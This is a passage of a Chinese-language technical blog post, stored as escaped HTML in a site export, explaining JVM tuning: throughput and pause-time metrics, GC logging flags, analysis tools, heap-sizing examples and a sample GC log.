class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-Xmx4g：堆内存最大值为4GB。</p>\n</li>\n<li><p>-Xms4g：初始化堆内存大小为4GB。</p>\n</li>\n<li><p>-Xmn1200m：<strong>设置年轻代大小为1200MB</strong>。增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3&#x2F;8。</p>\n</li>\n<li><p>-Xss512k：<strong>设置每个线程的堆栈大小</strong>。JDK5.0以后每个线程堆栈大小为1MB，以前每个线程堆栈大小为256K。应根据应用线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。</p>\n</li>\n<li><p>-XX:NewRatio&#x3D;4：<strong>设置年轻代（包括Eden和两个Survivor区）与年老代的比值（除去持久代）</strong>。设置为4，则年轻代与年老代所占比值为1：4，年轻代占整个堆栈的1&#x2F;5</p>\n</li>\n<li><p>-XX:SurvivorRatio&#x3D;8：<strong>设置年轻代中Eden区与Survivor区的大小比值</strong>。设置为8，则两个Survivor区与一个Eden区的比值为2:8，一个Survivor区占整个年轻代的1&#x2F;10</p>\n</li>\n<li><p>-XX:PermSize&#x3D;100m：初始化永久代大小为100MB。</p>\n</li>\n<li><p>-XX:MaxPermSize&#x3D;256m：设置持久代大小为256MB。</p>\n</li>\n<li><p>-XX:MaxTenuringThreshold&#x3D;15：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p>\n</li>\n</ul>\n<p><strong>可调优参数：</strong></p>\n<ul>\n<li><p>-Xms：初始化堆内存大小，默认为物理内存的1&#x2F;64(小于1GB)。</p>\n</li>\n<li><p>-Xmx：<strong>堆内存最大值</strong>。默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。</p>\n</li>\n<li><p>-Xmn：新生代大小，包括Eden区与2个Survivor区。</p>\n</li>\n<li><p>-XX:SurvivorRatio&#x3D;1：Eden区与一个Survivor区比值为1:1。</p>\n</li>\n<li><p>-XX:MaxDirectMemorySize&#x3D;1G：<strong>直接内存</strong>。报java.lang.OutOfMemoryError: Direct buffer memory异常可以上调这个值。</p>\n</li>\n<li><p>-XX:+DisableExplicitGC：禁止运行期显式地调用System.gc()来触发fulll GC。</p>\n</li>\n<li><p>注意: Java RMI的定时GC触发机制可通过配置-Dsun.rmi.dgc.server.gcInterval&#x3D;86400来控制触发的时间。</p>\n</li>\n<li><p>-XX:CMSInitiatingOccupancyFraction&#x3D;60：老年代内存回收阈值，默认值为68。</p>\n</li>\n<li><p>-XX:ConcGCThreads&#x3D;4：CMS垃圾回收器并行线程线，推荐值为CPU核心数。</p>\n</li>\n<li><p>-XX:ParallelGCThreads&#x3D;8：新生代并行收集器的线程数。</p>\n</li>\n<li><p>-XX:MaxTenuringThreshold&#x3D;10：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p>\n</li>\n<li><p>-XX:CMSFullGCsBeforeCompaction&#x3D;4：指定进行多少次fullGC之后，进行tenured区 内存空间压缩。</p>\n</li>\n<li><p>-XX:CMSMaxAbortablePrecleanTime&#x3D;500：当abortable-preclean预清理阶段执行达到这个时间时就会结束。</p>\n</li>\n</ul>\n<h4 id=\"8-8、内存调优示例\"><a href=\"#8-8、内存调优示例\" class=\"headerlink\" title=\"8.8、内存调优示例\"></a>8.8、内存调优示例</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-XX:+PrintGC 　　输出GC日志  </span><br><span class=\"line\">\\-XX:+PrintGCDetails 输出GC的详细日志  </span><br><span class=\"line\">\\-XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）  </span><br><span class=\"line\">\\-XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）  </span><br><span class=\"line\">\\-XX:+PrintHeapAtGC 　　在进行GC的前后打印出堆的信息  </span><br><span class=\"line\">\\-Xloggc:../logs/gc.log 日志文件的输出路径  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/24.png\"></p>\n<ul>\n<li><p>java heap：参数-Xms和-Xmx，建议扩大至3-4倍FullGC后的老年代空间占用。</p>\n</li>\n<li><p>永久代：-XX:PermSize和-XX:MaxPermSize，建议扩大至1.2-1.5倍FullGc后的永久代空间占用。</p>\n</li>\n<li><p>新生代：-Xmn，建议扩大至1-1.5倍FullGC之后的老年代空间占用。</p>\n</li>\n<li><p>老年代：2-3倍FullGC后的老年代空间占用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xms373m -Xmx373m //4\\*93=372  </span><br><span class=\"line\">\\-Xmn140m //1.5\\*93=139.5  </span><br><span class=\"line\">\\-XX:PermSize=5m -XX:MaxPermSize=5m //1.5\\*3=4.5  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"九-、结语\"><a href=\"#九-、结语\" class=\"headerlink\" title=\"九 、结语\"></a>九 、结语</h2><p>在JVM调优中，关键在于准确识别系统的性能瓶颈和优化方向，选择适合的调优策略和参数。</p>\n<p>实施调优方案后，必须验证效果，并持续监控系统性能，及时调整优化策略和参数以保持系统高性能和稳定性。</p>\n<p>同时，需要及时发现和解决各种潜在的性能问题，如内存泄漏、CPU飙升、频繁的垃圾回收等，以确保系统在高负载和复杂环境下能够保持卓越的性能表现。</p>\n<p>总之，JVM调优是一个持续改进的过程，通过对系统性能的深入分析和优化，确保Java应用程序在各种情况下都能够保持高效稳定的运行状态。</p>\n<p>随着硬件技术的迅速发展，JVM调优也将面临新的挑战和机遇。新一代的处理器、存储技术以及分布式系统架构等将对JVM调优提出更高的要求，需要更智能、更高效的优化方案来适应日益复杂的应用场景和巨大的数据处理需求。</p>\n<p>未来，JVM调优将持续创新和进步，以满足不断变化的业务需求和技术挑战，为Java应用程序提供更稳定、更高效的运行环境，推动Java生态系统的蓬勃发展和壮大。</p>\n<p>与开篇所述保持一致，我们强调在JVM调优中，真正的参数调整是较少的，更多的是通过分析日志和结合系统业务进行代码层面的优化。</p>\n<p>这可能是调优工作中占据更大比重的内容。我们不应迷失方向，只为了调优而调优，只为了调整参数而调整参数。最终，我们需要回归到业务本质，这才是最核心的内容。我们也需要更深入地了解JVM的相关参数，以更好地支撑业务需求的实现。</p>\n<h2 id=\"说在最后：有问题找老架构取经\"><a href=\"#说在最后：有问题找老架构取经\" class=\"headerlink\" title=\"说在最后：有问题找老架构取经\"></a>说在最后：有问题找老架构取经</h2><p><strong>JVM 调优方法论</strong>、JVM调优 相关的面试题，是非常常见的面试题。也是核心面试题。</p>\n<p>以上的内容，如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<h2 id=\"一：引言\"><a href=\"#一：引言\" class=\"headerlink\" title=\"一：引言\"></a>一：引言</h2><p>在软件开发和运维中，JVM作为执行Java程序的核心引擎，扮演着至关重要的角色。</p>\n<p>随着应用程序的复杂性和负载不断增加，对JVM的性能和稳定性要求也越来越高。</p>\n<p>在此背景下，JVM调优变得至关重要。</p>\n<p>JVM调优涉及到一系列的参数设置、垃圾收集器的选择、内存分配策略等方面，对于提高Java应用程序的性能、减少内存泄漏、降低系统崩溃风险都有重要作用。</p>\n<p>另外，在大厂面试中，JVM调优的知识也是备受关注的考察点，因为它直接关系到系统的稳定性和性能优化。</p>\n<p>候选人对JVM调优的理解和实践能力，可以反映其在Java虚拟机运行机制方面的深度和广度，</p>\n<p>需要注意的是，调优并非首选方法，一般而言，解决性能问题的第一步是优化程序本身，只有在必要时才考虑进行JVM调优。</p>\n<h2 id=\"JVM调优，有什么好处？\"><a href=\"#JVM调优，有什么好处？\" class=\"headerlink\" title=\"JVM调优，有什么好处？\"></a>JVM调优，有什么好处？</h2><p>JVM调优目的是通过调整Java虚拟机的配置参数、垃圾回收策略和内存分配等手段，提升Java应用程序的性能、稳定性和可靠性。</p>\n<p>随着应用规模和用户量的增长，原始的JVM配置可能无法满足业务需求，因此必须进行调优以确保系统的正常运行。</p>\n<p>然而，并不是所有异常情况都需要进行JVM调优。</p>\n<p>在实际情况中，大多数问题可以通过分析JVM日志文件和业务逻辑来定位，并通过业务层面的优化来解决。</p>\n<p>尽管如此，深入了解各项参数和指标仍然至关重要，因为它们有助于更快速地理解和解决问题，调优能带来什么好处？</p>\n<ul>\n<li><p><strong>性能层面：</strong></p>\n<p>通过调整JVM参数和优化垃圾回收机制，能够提高Java应用程序的性能，减少延迟，提升系统响应速度和并发能力、和吞吐量。</p>\n</li>\n<li><p><strong>资源利用：</strong></p>\n<p>合理配置JVM资源，包括内存、CPU等，能够有效地利用硬件资源，提高系统的资源利用率，降低成本。</p>\n</li>\n<li><p><strong>稳定性：</strong> 通过调优JVM，可减少内存泄漏、OOM（Out of Memory）等问题的发生，提高系统的稳定性和可靠性，降低系统崩溃的风险。</p>\n</li>\n</ul>\n<h2 id=\"二：JVM调优的关注哪些指标？\"><a href=\"#二：JVM调优的关注哪些指标？\" class=\"headerlink\" title=\"二：JVM调优的关注哪些指标？\"></a>二：JVM调优的关注哪些指标？</h2><p>调优，到底调的是什么？</p>\n<p>调优之前，要搞清楚一个问题：怎样才算是“优”。</p>\n<p>如何定性？</p>\n<p>如何定量？</p>\n<p>到底需要其实是需要关注几个关键的指标，以全面评估系统的运行状态和性能表现。</p>\n<p>需要有一个具体的指标来衡量性能情况，而在JVM里面衡量性能的两个核心指标分别“吞吐量”和“停顿时间”。</p>\n<h3 id=\"核心指标1：吞吐量-throughput-：\"><a href=\"#核心指标1：吞吐量-throughput-：\" class=\"headerlink\" title=\"核心指标1：吞吐量(throughput)：\"></a>核心指标1：吞吐量(throughput)：</h3><p>程序运行过程中执行两种任务，分别是执行业务代码的 任务 和进行垃圾回收的任务，</p>\n<p>吞吐量大，意就是说程序运行业务代码的时间越多， 换句话说，执行业务任务越多， 吞吐量就越高，</p>\n<p>吞吐量计算公式 ，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">吞吐量 = CPU在用户应用程序运行的时间 / （CPU在用户应用程序运行的时间 + CPU垃圾回收的时间），  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在实践中我们发现对于大多数的应用领域，评估一个垃圾收集(GC)算法如何，有如下一个核心标准：</p>\n<ul>\n<li>吞吐量越高越好</li>\n</ul>\n<p>一般而言GC 的吞吐量不能低于 95%。</p>\n<p>本质上，吞吐量是指应用程序线程用时占程序总用时的比例。</p>\n<p>例如，吞吐量99&#x2F;100， 意味着100秒的程序执行时间，应用程序线程运行了99秒， 而在这一时间段内GC线程只运行了1秒。</p>\n<h3 id=\"核心指标2：停顿时间-pause-times-：\"><a href=\"#核心指标2：停顿时间-pause-times-：\" class=\"headerlink\" title=\"核心指标2：停顿时间(pause times)：\"></a>核心指标2：停顿时间(pause times)：</h3><p>JVM在专门的线程(GC threads)中执行GC。</p>\n<p>因为JVM进行垃圾回收的时候，某些阶段必须要停止业务线程专心进行垃圾收集， 只要GC线程是活动的，它们将与应用程序线程(application threads)争用当前可用CPU的时钟周期。</p>\n<p>停顿时间(pause times) 是指一个时间段内应用程序线程让与GC线程执行，而应用程序线程完全暂停。</p>\n<p>例如，GC期间100毫秒的停顿时间， 意味着在这100毫秒期间内没有应用程序线程是活动的。</p>\n<p>如果说一个正在运行的应用程序有100毫秒的“平均停顿时间”，那么就是说该应用程序所有的停顿时间平均长度为100毫秒。</p>\n<p>同样，100毫秒的“最大停顿时间”是指：该应用程序所有的停顿时间最大不超过100毫秒。</p>\n<p>注意，这里说的JVM停顿时间，就是指JVM停止业务线程而去进行垃圾收集的这段时长，其实指的是<strong>每次GC造成用户线程停顿的平均时间</strong>，不是总的垃圾回收时间。</p>\n<p>停顿时间越长，就意味着GC场景下，用户线程平均等待的时间越长，停顿时间会直接影响用户使用系统的体验。</p>\n<p>除了吞吐量(throughput) 、停顿时间(pause times) 两个核心指标，JVM调优还会关心下面的非核心指标：</p>\n<h3 id=\"核心指标3：堆内存占用量：\"><a href=\"#核心指标3：堆内存占用量：\" class=\"headerlink\" title=\"核心指标3：堆内存占用量：\"></a>核心指标3：堆内存占用量：</h3><p>细致监控堆内存使用量、非堆内存使用量以及永久代（或元空间）使用量指标数据。</p>\n<p>举例来说，当堆内存使用量持续增加，而内存回收频率较低时，可能暗示着潜在的内存泄漏问题，这可能导致系统性能下降或者最终的内存耗尽（OOM）。</p>\n<h3 id=\"非核指标1：垃圾回收次数\"><a href=\"#非核指标1：垃圾回收次数\" class=\"headerlink\" title=\"非核指标1：垃圾回收次数\"></a>非核指标1：垃圾回收次数</h3><p>GC非常占用CPU资源的，如果GC占用的资源越多，那么意味着其他事情所用的资源会减少，系统所能做的事情也会越少。</p>\n<p>尽管垃圾回收过程会消耗大量的CPU资源，但是我们也不能单纯地、一味的追求GC次数减少</p>\n<p>为啥? GC次数减少了，有可能单次GC的时间变长，那么就可能会增加单次GC的“停顿时长”（核心指标2），</p>\n<h3 id=\"非核指标2：垃圾回收频率\"><a href=\"#非核指标2：垃圾回收频率\" class=\"headerlink\" title=\"非核指标2：垃圾回收频率\"></a>非核指标2：垃圾回收频率</h3><p>通常情况下，与垃圾回收次数相比，较低的垃圾回收频率被认为是更好的选择。</p>\n<p>垃圾回收的频率,需要适中</p>\n<ul>\n<li><p>频率过小,每次垃圾回收的时间会过长</p>\n</li>\n<li><p>频率过大,停顿时间长,延迟高</p>\n</li>\n</ul>\n<p>所以：通常来说垃圾回收频率是越低越好。</p>\n<p>详细记录GC频率、GC停顿时间以及每次GC后的内存情况。</p>\n<p>或者说：减少 GC次数可能会导致单次垃圾回收的时间变长，进而增加单次垃圾回收的“停顿时长”。</p>\n<p>所以， 需要在这两者之间做一些平衡。</p>\n<h2 id=\"吞吐量、暂停时间、堆内存占用三者之间的关系\"><a href=\"#吞吐量、暂停时间、堆内存占用三者之间的关系\" class=\"headerlink\" title=\"吞吐量、暂停时间、堆内存占用三者之间的关系\"></a>吞吐量、暂停时间、堆内存占用三者之间的关系</h2><p>这三个指标不可能同时达到,因为他们是一个不可能的关系</p>\n<p><strong>内存变大,要回收的东西变多,暂停时间自然增加.</strong></p>\n<p><strong>吞吐量增加,必然要降低垃圾回收频率,频率降低,垃圾谁收停顿时间必然增大.</strong></p>\n<p>因此,目前gc的优化方向主要是<strong>吞吐量和暂停时间.</strong></p>\n<h3 id=\"“高吞吐量”和“低停顿时间”是一对相互竞争的目标\"><a href=\"#“高吞吐量”和“低停顿时间”是一对相互竞争的目标\" class=\"headerlink\" title=\"“高吞吐量”和“低停顿时间”是一对相互竞争的目标\"></a>“高吞吐量”和“低停顿时间”是一对相互竞争的目标</h3><p>高吞吐量最好因为这会让应用程序的最终用户感觉只有应用程序线程在做“生产性”工作。</p>\n<p>直觉上，吞吐量越高程序运行越快。</p>\n<p>低停顿时间最好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。</p>\n<p>这取决于应用程序的类型，有时候甚至短暂的200毫秒暂停都可能打断终端用户体验。</p>\n<p>因此，具有低的最大停顿时间是非常重要的，特别是对于一个交互式应用程序。</p>\n<p>不幸的是”高吞吐量”和”低停顿时间”是一对相互竞争的目标（矛盾）。</p>\n<p>GC需要一定的前提条件以便安全地运行。</p>\n<p>例如，必须保证应用程序线程在GC线程试图确定哪些对象仍然被引用和哪些没有被引用的时候不修改对象的状态。</p>\n<p>为此，应用程序在GC期间必须停止(或者仅在GC的特定阶段，这取决于所使用的算法)。 然而这会增加额外的线程调度开销：直接开销是上下文切换，间接开销是因为缓存的影响。</p>\n<p>加上JVM内部安全措施的开销，这意味着GC及随之而来的不可忽略的开销，将增加GC线程执行实际工作的时间。</p>\n<p>因此我们可以通过尽可能少运行GC，来最大化吞吐量，例如，只有在不可避免的时候进行GC，来节省所有与它相关的开销。</p>\n<p>然而，仅仅偶尔运行GC意味着每当GC运行时将有许多工作要做，因为在此期间积累在堆中的对象数量很高。 单个GC需要花更多时间来完成， 从而导致更高的平均和最大停顿时间。</p>\n<p>因此，考虑到低停顿时间，最好频繁地运行GC以便更快速地完成。这反过来又增加了开销并导致吞吐量下降，我们又回到了起点。</p>\n<p>综上所述，在设计（或使用）GC算法时，我们必须确定我们的目标：</p>\n<p>一个GC算法只可能针对两个目标之一（即只专注于最大吞吐量或最小停顿时间），或尝试找到一个二者的折衷。</p>\n<h3 id=\"吞吐量和暂停时间是矛盾的-如何抉择\"><a href=\"#吞吐量和暂停时间是矛盾的-如何抉择\" class=\"headerlink\" title=\"吞吐量和暂停时间是矛盾的,如何抉择?\"></a>吞吐量和暂停时间是矛盾的,如何抉择?</h3><p>高吞吐量较好因为这会让应用程序的最终用户感觉只有应用程序线程在做”生产性”工作。直觉上,吞吐量越高程序运行越快。</p>\n<p>低暂停时间(低延迟)较好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型, 有时候甚至短暂的200毫秒暂停都可能打断终端用户体验 。因此,具有低的较大暂停时间是非常重要的,特别是对于一个 交互式应用程序 。</p>\n<p>不幸的是”高吞吐量”和”低暂停时间”是一对相互竞争的目标(矛盾)。</p>\n<ul>\n<li><p>因为如果选择以吞吐量优先,那么 必然需要降低内存回收的执行频率 ,但是这样会导致GC需要更长的暂停时间来执行内存回收。</p>\n</li>\n<li><p>相反的,如果选择以低延迟优先为原则,那么为了降低每次执行的内存回收时的暂停时间,也 只能频繁地执行内存回收 ,但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。</p>\n</li>\n</ul>\n<p>在设计(或使用)GC算法时,我们必须确定我们的目标: 一个GC算法可能针对两个目标之一(即只专注于较大吞吐量或最小暂停时间),或尝试找到一个二者的折中。</p>\n<p>现在标准: 在最大吞吐量优先的情况下,降低停顿时间</p>\n<h3 id=\"不同的垃圾回收器有不同的抉择方向\"><a href=\"#不同的垃圾回收器有不同的抉择方向\" class=\"headerlink\" title=\"不同的垃圾回收器有不同的抉择方向:\"></a>不同的垃圾回收器有不同的抉择方向:</h3><ul>\n<li><p>Parallel以吞吐量优先</p>\n</li>\n<li><p>cms以停顿时间优先</p>\n</li>\n<li><p>而G1则取折中方案: 在保证用户可接受的停顿时间的前提下,尽可能提高吞吐量.</p>\n</li>\n</ul>\n<p>JVM调优没有万能的公式和标准，因为每个人所面对的场景是不一样。</p>\n<p>要想调整到最优的性能，其实首先要确认的是自己的需求目标是什么(以吞吐量优先&#x2F;停顿时间优先)，</p>\n<p>然后，根据这个目标去慢慢的调整各项指标，从而达到一个最佳的平衡点。</p>\n<h2 id=\"三：如果获得JVM内存指标\"><a href=\"#三：如果获得JVM内存指标\" class=\"headerlink\" title=\"三：如果获得JVM内存指标?\"></a>三：如果获得JVM内存指标?</h2><p>在项目启动的时候 增加下列参数来收集GC日志，然后通过第三方的日志分析工具（比如GCesay:<a href=\"https://gceasy.io/%EF%BC%89\">https://gceasy.io/）</a></p>\n<p>分析收集到的GC日志来得到吞吐量、停顿时间相关的统计数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">java    </span><br><span class=\"line\">-XX:+PrintGCDetails -XX:+PrintGCDateStamps   </span><br><span class=\"line\">-XX:+UseGCLogFileRotation   </span><br><span class=\"line\">-XX:+PrintHeapAtGC -XX:NumberOfGCLogFiles=5    </span><br><span class=\"line\">-XX:GCLogFileSize=20M      </span><br><span class=\"line\">-Xloggc:/opt/ard-user-gc-%t.log    </span><br><span class=\"line\">-jar abg-user-1.0-SNAPSHOT.jar </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-Xloggc:/opt/app/ard-user/ard-user-gc-%t.log   设置日志目录和日志名称  </span><br><span class=\"line\">-XX:+UseGCLogFileRotation           开启滚动生成日志  </span><br><span class=\"line\">-XX:NumberOfGCLogFiles=5            滚动GC日志文件数，默认0，不滚动  </span><br><span class=\"line\">-XX:GCLogFileSize=20M               GC文件滚动大小，需开启UseGCLogFileRotation  </span><br><span class=\"line\">-XX:+PrintGCDetails                 开启记录GC日志详细信息（包括GC类型、各个操作使用的时间）,并且在程序运行结束打印出JVM的内存占用情况  </span><br><span class=\"line\">-XX:+ PrintGCDateStamps             记录系统的GC时间             </span><br><span class=\"line\">-XX:+PrintGCCause                   产生GC的原因(默认开启)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"日志分析工具有哪些？\"><a href=\"#日志分析工具有哪些？\" class=\"headerlink\" title=\"日志分析工具有哪些？\"></a>日志分析工具有哪些？</h3><p>我们看到日志，尤其是CMS和G1的日志，直接看日志文档都是很不方便的，密密麻麻的文字，其实市面上已经有一些日志分析工具了。</p>\n<p>进行系统调优时，首先需要对系统的各项指标进行检测。为了有效地进行监测和设置相应的阈值，我们通常会借助监控工具，例如普罗米修斯等。在分析阶段，以下工具是常用的：</p>\n<ol>\n<li><p>VisualVM：</p>\n<p>这是一个功能强大、可扩展的开源工具，用于深入分析Java应用程序。它提供了丰富的功能，包括性能监控、内存使用情况、垃圾回收情况等，并支持线程分析、堆快照等功能。</p>\n</li>\n<li><p>Java Mission Control (JMC)：</p>\n<p>由Oracle提供的专业Java性能监控和故障诊断工具。JMC集成了多种强大功能，包括垃圾回收分析、内存泄漏检测、线程分析等。</p>\n</li>\n<li><p>jvisualvm：</p>\n<p>这是JDK自带的监控和调试工具，可用于监视本地和远程Java应用程序的性能、内存使用情况等。它提供了直观的图形界面和丰富的监控指标。</p>\n</li>\n<li><p>JConsole：</p>\n<p>JConsole是JDK自带的监控工具，提供了基本的图形界面，可用于监视Java应用程序的内存使用情况、线程信息、垃圾回收情况等。</p>\n</li>\n<li><p>GCViewer：</p>\n<p>这是专门用于分析Java应用程序垃圾回收日志的工具。</p>\n<p>GCViewer能将GC日志解析成易于理解的图表和统计信息，帮助用户分析和优化垃圾回收行为。</p>\n</li>\n</ol>\n<p>接下来，介绍使用 gceasy.io 进行 日志分析</p>\n<p>网址：<a href=\"https://gceasy.io/\">https://gceasy.io/</a></p>\n<p>注意：这款工具不需要我们下载软件，他是在线的。</p>\n<p>我们要做的就是两步：</p>\n<p>步骤一：导出GC日志到本地磁盘</p>\n<p>步骤二：将本地日志上传到gceasy.io上，进行分析</p>\n<h3 id=\"指标分析第一步：导出日志\"><a href=\"#指标分析第一步：导出日志\" class=\"headerlink\" title=\"指标分析第一步：导出日志\"></a>指标分析第一步：导出日志</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xloggc:/Users/lxl/Downloads/gc.log  </span><br><span class=\"line\">\\-XX:+PrintGCDetails  </span><br><span class=\"line\">\\-XX:+PrintGCDateStamps  </span><br><span class=\"line\">\\-XX:+PrintGCTimeStamps  </span><br><span class=\"line\">\\-XX:+PrintGCCause  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>‐Xloggc参数：指定gc日志的保存地址。这里指定的是当前目录，文件名以gc-+时间戳.log打印。%t表示时间戳</p>\n</li>\n<li><p>‐XX:+PrintGCDetails：在日志中打印GC详情。</p>\n</li>\n<li><p>‐XX:+PrintGCDateStamps：在日志中打印GC的时间</p>\n</li>\n<li><p>‐XX:+PrintGCTimeStamps：在日志中打印GC耗时</p>\n</li>\n<li><p>‐XX:+PrintGCCause ： [这个参数没查到]</p>\n</li>\n<li><p>‐XX:+UseGCLogFileRotation：这个参数表示以滚动文件的形式打印日志</p>\n</li>\n<li><p>‐XX:NumberOfGCLogFiles：GC日志文件的最大个数，这里设置10个</p>\n</li>\n<li><p>‐XX:GCLogFileSize：GC日志每个文件的最大容量，这里是100M</p>\n</li>\n</ul>\n<p>我们把日志下载到Downloads文件夹下了。以下便是GC日志的全部内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (25.202-b08) for bsd-amd64 JRE (1.8.0\\_202-b08), built on Dec 15 2018 20:16:16 by &quot;java\\_re&quot; with gcc 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00)  </span><br><span class=\"line\">Memory: 4k page, physical 16777216k(1745536k free)  </span><br><span class=\"line\">/proc/meminfo:  </span><br><span class=\"line\">CommandLine flags: -XX:-BytecodeVerificationLocal -XX:-BytecodeVerificationRemote -XX:InitialHeapSize=268435456 -XX:+ManagementServer -XX:MaxHeapSize=4294967296 -XX:+PrintGC -XX:+PrintGCCause -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:TieredStopAtLevel=1 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC   </span><br><span class=\"line\">2022-01-12T15:02:37.044-0800: 0.839: \\[GC (Allocation Failure) \\[PSYoungGen: 65536K-&gt;4400K(76288K)\\] 65536K-&gt;4416K(251392K), 0.0043915 secs\\] \\[Times: user=0.01 sys=0.00, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.308-0800: 1.103: \\[GC (Allocation Failure) \\[PSYoungGen: 69936K-&gt;4959K(76288K)\\] 69952K-&gt;5047K(251392K), 0.0046449 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.625-0800: 1.420: \\[GC (Allocation Failure) \\[PSYoungGen: 70495K-&gt;7467K(76288K)\\] 70583K-&gt;7563K(251392K), 0.0051392 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.831-0800: 1.627: \\[GC (Allocation Failure) \\[PSYoungGen: 73003K-&gt;9356K(141824K)\\] 73099K-&gt;9460K(316928K), 0.0072596 secs\\] \\[Times: user=0.03 sys=0.01, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.869-0800: 1.664: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 22322K-&gt;7049K(141824K)\\] 22426K-&gt;7161K(316928K), 0.0057809 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.875-0800: 1.670: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 7049K-&gt;0K(141824K)\\] \\[ParOldGen: 112K-&gt;6873K(87040K)\\] 7161K-&gt;6873K(228864K), \\[Metaspace: 20573K-&gt;20571K(1067008K)\\], 0.0237404 secs\\] \\[Times: user=0.09 sys=0.01, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:38.392-0800: 2.188: \\[GC (Allocation Failure) \\[PSYoungGen: 131072K-&gt;7194K(236032K)\\] 137945K-&gt;14075K(323072K), 0.0054542 secs\\] \\[Times: user=0.01 sys=0.01, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:39.850-0800: 3.646: \\[GC (Allocation Failure) \\[PSYoungGen: 235546K-&gt;9697K(270336K)\\] 242427K-&gt;20203K(357376K), 0.0092838 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:40.479-0800: 4.274: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 179780K-&gt;12779K(397312K)\\] 190286K-&gt;25839K(484352K), 0.0117953 secs\\] \\[Times: user=0.04 sys=0.01, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:40.491-0800: 4.286: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 12779K-&gt;0K(397312K)\\] \\[ParOldGen: 13059K-&gt;21448K(132096K)\\] 25839K-&gt;21448K(529408K), \\[Metaspace: 34068K-&gt;34068K(1079296K)\\], 0.0437361 secs\\] \\[Times: user=0.16 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:42.177-0800: 5.972: \\[GC (Allocation Failure) \\[PSYoungGen: 384512K-&gt;13185K(399872K)\\] 405960K-&gt;34641K(531968K), 0.0115070 secs\\] \\[Times: user=0.04 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:43.010-0800: 6.806: \\[GC (Allocation Failure) \\[PSYoungGen: 397697K-&gt;16864K(530432K)\\] 419153K-&gt;58461K(662528K), 0.0248406 secs\\] \\[Times: user=0.04 